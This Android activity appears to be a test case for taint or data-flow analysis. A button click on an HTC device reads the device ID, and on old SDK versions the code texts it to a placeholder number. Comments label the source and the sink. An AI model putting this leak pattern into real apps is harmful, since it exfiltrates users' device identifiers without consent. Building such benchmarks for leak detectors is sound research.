package de.upb.swt.callbacks1;

import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {
    String msg;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final Button button=(Button) findViewById(R.id.button);
        button.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
                        String model= Build.MODEL;
                        if(model.equals("HTC"))
                        {
                            String deviceID= telephonyManager.getDeviceId();//source, MODEL ^ onClick
                            send(deviceID);
                        }
                    }
                }
        );
    }

    void send(String deviceID)
    {
        int sdk = Build.VERSION.SDK_INT;
        if (sdk < 15) {
            SmsManager sms = SmsManager.getDefault();//sdk>15
            sms.sendTextMessage("+49", null,deviceID, null, null); // sink,  sdk<15 ^ onClick
        }
    }
}
